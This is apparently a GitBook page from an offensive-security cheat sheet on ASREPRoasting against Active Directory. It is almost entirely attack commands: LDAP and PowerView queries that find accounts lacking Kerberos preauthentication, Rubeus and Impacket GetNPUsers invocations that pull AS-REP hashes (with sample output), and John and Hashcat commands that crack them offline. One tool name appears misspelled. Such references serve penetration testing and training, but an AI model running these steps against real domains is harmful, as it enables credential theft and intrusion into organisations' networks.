---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/ad-attack/kerberos-attack/asreproasting
---

# ASREPRoasting

## Discovery ASREP account

{% code overflow="wrap" %}
```powershell
# ADSearch
ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname

# PowerView
Get-DomainUser -PreauthNotRequired
```
{% endcode %}

## Rubeus

```powershell
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /user:svc /nowrap
```

## Impacket

```python
└─$ impacket-GetNPUsers vulnableone.local/app-svc -dc-ip 10.10.10.10 -no-pass
└─$ impacket-GetNPUsers -no-pass -usersfile svc.txt -dc-ip 10.10.10.10 'vulnableone.local/'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

$krb5asrep$23$svc-admin@VULNABLEONE.LOCAL:abe0d0e1b34713c079bfcada6483eaf6...
```

## Crack Hash

### John

```bash
$ kirb2j0hn ticket.kirbi > crackfile
john --format=krb5asrep --wordlist=wordlist svc-admin

$ john --format=krb5asrep --wordlist=wordlist svc-admin
```

### Hashcat

<pre class="language-bash"><code class="lang-bash"><strong>hashcat -a 0 -m 18200 svc-admin wordlist
</strong></code></pre>
